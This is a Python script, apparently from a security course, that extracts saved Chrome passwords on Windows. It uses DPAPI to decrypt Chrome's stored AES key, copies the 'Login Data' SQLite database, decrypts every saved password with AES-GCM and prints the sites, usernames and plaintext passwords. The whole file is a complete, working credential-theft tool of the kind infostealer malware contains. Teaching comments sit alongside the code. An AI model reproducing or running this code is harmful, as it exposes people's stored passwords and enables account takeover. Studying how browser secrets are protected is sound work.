import os
import json
import base64
import sqlite3
from ctypes import *
from ctypes.wintypes import DWORD
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import shutil
from datetime import timezone, datetime, timedelta

CryptUnprotectData = windll.crypt32.CryptUnprotectData
LocalFree = windll.kernel32.LocalFree
memcpy = cdll.msvcrt.memcpy


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', DWORD),
        ('pbData', POINTER(c_char))
    ]

def get_data(blob_out):
    # Source:
    #https://github.com/jsternberg/waf/blob/master/waflib/extras/dpapi.py
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    memcpy(buffer, pbData, cbData)
    LocalFree(pbData);
    return buffer.raw


def decrypt_data_dpapi(encrypted_bytes):
    # Source:
    #https://github.com/jsternberg/waf/blob/master/waflib/extras/dpapi.py
    entropy = b""
    buffer_in      = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in        = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy   = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out       = DATA_BLOB()
    if CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None,
        None, None, byref(blob_out)):
        return get_data(blob_out)
    print("[!] Decryption Failed")
    return -1


def get_local_state():
    # load 
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    print(f"[+] Local state located at {local_state_path}")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    return local_state
    

def get_encryption_key():
    
    local_state = get_local_state()

    # load the base64 encoded key
    b64_key = local_state["os_crypt"]["encrypted_key"]
    key = base64.b64decode(b64_key)
    print(key)
    # the DPAPI sets magic bytes to denote a string as being protected by the DPAPI
    # see for yourself, the "DPAPI" string attatched to the bytes
    # note that these bytes are in fact the encrypted symmetric key used by Chrome 
    # to encrypt/decrypt secrets
    print(key[:10])
    key = key[5:]
    # below will only work if the current user is running this script. I.ee, we need the logon credentials 
    return decrypt_data_dpapi(key)

def decrypt_password(encrypted_password, key):
    try:
        # Parse the IV. This is a constnat used in AES GCM that we will talk about next week!
        # the IV will be in the same place across all machines 
        iv = encrypted_password[3:15]
        # the actual ciphertext is the remaining bytes
        ciphertext = encrypted_password[15:]
        # Decrypt the password 
        print(len(key))
        cipher =  AESGCM(key)
        pt = cipher.decrypt(iv,ciphertext , None).decode()
        print("CT:",pt)
        #cipher = AES.new(key, AES.MODE_GCM, iv)
        #return cipher.decrypt(ciphertext)[:-16].decode()
        return pt 
    except Exception as e:
        print(Exception, e,)
        # if the above fails, it is possible that your browsert is OLD 
        # in that case, you can just directly call the DPAPI 
        try:
            return str(decrypt_data_dpapi(ciphertext))
        except:
            # not supported
            return ""

def main():
    # get the AES key
    key = get_encryption_key()
    print("Key retrieved: ", key)
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
 
    filename = "ChromeData.db"
    # Note we copy the data because if chrome is open, we can't read the sqlite database!
    # Remember, SQLite is single user.
    shutil.copyfile(db_path, filename)
    # connect to the database
    print(db_path)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    # `logins` table has the data we need
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows

    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)        
        if username or password:
            print("*"*70)
            print(f"Origin URL: {origin_url}")
            print(f"Action URL: {action_url}")
            print(f"Username: {username}")
            print(f"Password: {password}")
            print("*"*70)
        else:
            continue
     
        print("="*70)
    cursor.close()
    db.close()
    try:
        # try to remove the copied db file
        os.remove(filename)
    except:
        print("Failed to delete copied file ")


if __name__ == "__main__":
    main()